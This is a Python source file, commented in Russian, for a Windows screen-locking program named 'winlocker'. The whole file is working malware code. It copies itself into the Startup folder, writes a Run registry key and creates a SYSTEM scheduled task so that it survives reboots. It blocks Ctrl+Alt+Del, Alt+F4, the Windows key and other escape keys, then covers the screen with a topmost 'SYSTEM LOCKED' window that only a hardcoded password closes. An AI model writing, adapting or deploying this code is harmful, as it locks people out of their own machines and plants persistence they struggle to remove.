import tkinter as tk
import random
import threading
import time
import os
import sys
import shutil
import subprocess
import ctypes

# ========== КОНФИГУРАЦИЯ ==========
CONFIG = {
    "PASSWORD": "12345GOG",
    "MAX_ATTEMPTS": 10,
    "BG_COLOR": "black",
    "TEXT_COLOR": "#00ff00",
    "PANEL_COLOR": "#001100",
    "BORDER_COLOR": "#00ff00"
}

attempts = 0
running = True
# ==================================

# ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# ========== АВТОЗАГРУЗКА ==========

def add_to_startup():
    """Добавляет программу в автозагрузку"""
    try:
        if getattr(sys, 'frozen', False):
            current_file = sys.executable
        else:
            current_file = os.path.abspath(__file__)
        
        # Папка Startup
        startup_folder = os.path.join(os.environ['APPDATA'], 
                                      'Microsoft', 'Windows', 'Start Menu', 
                                      'Programs', 'Startup')
        dest_path = os.path.join(startup_folder, "winlocker.exe")
        shutil.copy2(current_file, dest_path)
        
        # Реестр
        subprocess.run(
            f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
            f'/v "WinLocker" /t REG_SZ /d "{dest_path}" /f',
            shell=True, capture_output=True
        )
        
        # Планировщик (если есть права)
        if is_admin():
            subprocess.run(
                f'schtasks /create /tn "WinLockerUpdate" /tr "{dest_path}" '
                f'/sc onlogon /ru "SYSTEM" /f /rl HIGHEST',
                shell=True, capture_output=True
            )
    except:
        pass

# ========== БЛОКИРОВКА КОМБИНАЦИЙ ==========

def block_combinations():
    """Блокирует опасные комбинации клавиш"""
    try:
        import keyboard
        
        # Системные клавиши
        for key in ['alt', 'ctrl', 'windows', 'delete', 'escape']:
            try: keyboard.block_key(key)
            except: pass
        
        # Комбинации
        for hotkey in ['alt+f4', 'ctrl+alt+del', 'ctrl+shift+esc', 'windows+r']:
            try: keyboard.add_hotkey(hotkey, lambda: None)
            except: pass
    except ImportError:
        pass  # Если нет библиотеки - просто пропускаем

# ========== ОКНО ==========

root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.configure(bg=CONFIG["BG_COLOR"])
root.overrideredirect(True)

canvas = tk.Canvas(
    root,
    width=root.winfo_screenwidth(),
    height=root.winfo_screenheight(),
    bg=CONFIG["BG_COLOR"],
    highlightthickness=0
)
canvas.pack()

# ========== ИНТЕРФЕЙС ==========

def draw_background():
    """Фоновые символы"""
    for _ in range(25):
        x = random.randint(0, root.winfo_screenwidth())
        y = random.randint(0, root.winfo_screenheight())
        canvas.create_text(
            x, y, text='0x7F',
            fill='#0a3a0a',
            font=("Courier", random.randint(8, 12)),
            tags="bg"
        )

def draw_panel():
    """Главная панель"""
    cx = root.winfo_screenwidth() // 2
    cy = root.winfo_screenheight() // 2
    
    # Рамка
    canvas.create_rectangle(
        cx-300, cy-150, cx+300, cy+200,
        outline=CONFIG["BORDER_COLOR"],
        width=3,
        fill=CONFIG["PANEL_COLOR"],
        tags="panel"
    )
    
    # Текст
    canvas.create_text(
        cx, cy-100,
        text="⚠️ SYSTEM LOCKED ⚠️",
        fill=CONFIG["TEXT_COLOR"],
        font=("Courier", 28, "bold"),
        tags="panel"
    )
    
    canvas.create_text(
        cx, cy,
        text=f"ATTEMPTS: {attempts}/{CONFIG['MAX_ATTEMPTS']}",
        fill=CONFIG["TEXT_COLOR"],
        font=("Courier", 16),
        tags="panel"
    )
    
    canvas.create_text(
        cx, cy+50,
        text="ENTER PASSWORD:",
        fill=CONFIG["TEXT_COLOR"],
        font=("Courier", 14),
        tags="panel"
    )

def draw_ui():
    canvas.delete("all")
    draw_background()
    draw_panel()

# Элементы ввода
entry = tk.Entry(
    root,
    font=("Courier", 18),
    show="*",
    width=15,
    justify='center',
    bg='black',
    fg=CONFIG["TEXT_COLOR"],
    insertbackground=CONFIG["TEXT_COLOR"]
)
entry.place(relx=0.5, rely=0.6, anchor='center')
entry.focus()

error_label = tk.Label(
    root,
    text="",
    font=("Courier", 12),
    fg=CONFIG["TEXT_COLOR"],
    bg='black'
)
error_label.place(relx=0.5, rely=0.7, anchor='center')

# ========== КРАСНЫЙ ЭКРАН ==========

def show_red_screen():
    canvas.delete("all")
    canvas.configure(bg='black')
    
    cx = root.winfo_screenwidth() // 2
    cy = root.winfo_screenheight() // 2
    
    canvas.create_text(
        cx, cy-100,
        text="💀 SYSTEM ERROR 💀",
        fill='red',
        font=("Courier", 50, "bold")
    )
    canvas.create_text(
        cx, cy,
        text="TOO MANY FAILED ATTEMPTS",
        fill='red',
        font=("Courier", 30)
    )
    canvas.create_text(
        cx, cy+80,
        text="RESTART YOUR COMPUTER",
        fill='red',
        font=("Courier", 30)
    )
    
    entry.place_forget()
    error_label.place_forget()
    
    def keep():
        root.update()
        root.after(100, keep)
    
    keep()

# ========== ПРОВЕРКА ПАРОЛЯ ==========

def check_password(event=None):
    global attempts
    
    if entry.get() == CONFIG["PASSWORD"]:
        root.destroy()
        sys.exit()
    else:
        attempts += 1
        error_label.config(text=f"ACCESS DENIED! ATTEMPT {attempts}")
        entry.delete(0, tk.END)
        draw_ui()
        
        if attempts >= CONFIG["MAX_ATTEMPTS"]:
            show_red_screen()

# ========== ЗАПУСК ==========

draw_ui()
add_to_startup()

try:
    threading.Thread(target=block_combinations, daemon=True).start()
except:
    pass

root.bind('<Return>', check_password)
root.mainloop()